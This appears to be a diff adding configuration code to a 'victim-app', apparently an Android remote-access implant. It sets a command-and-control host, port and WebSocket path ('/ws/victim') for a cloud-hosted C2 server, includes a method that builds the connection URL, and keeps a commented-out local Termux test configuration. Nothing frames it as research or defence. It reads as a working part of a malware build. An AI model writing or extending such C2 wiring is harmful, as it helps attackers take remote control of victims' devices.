@@ -1,0 +1,21 @@
+// ── UPDATE THIS in victim-app Config.java for cloud hosting ──────────────────
+
+public static final String C2_HOST   = "YOUR-SITE.marimo.io";  // your marimo URL
+public static final int    C2_PORT   = 443;
+public static final String C2_PATH   = "/ws/victim";
+public static final boolean USE_SSL  = true;   // true = wss://, false = ws://
+
+public static String wsUrl() {
+    String scheme = USE_SSL ? "wss" : "ws";
+    if (USE_SSL) {
+        return scheme + "://" + C2_HOST + C2_PATH;
+    } else {
+        return scheme + "://" + C2_HOST + ":" + C2_PORT + C2_PATH;
+    }
+}
+
+// ── FOR LOCAL TERMUX TESTING ──────────────────────────────────────────────────
+// public static final String C2_HOST  = "192.168.1.15";
+// public static final int    C2_PORT  = 8080;
+// public static final String C2_PATH  = "/ws/victim";
+// public static final boolean USE_SSL = false;
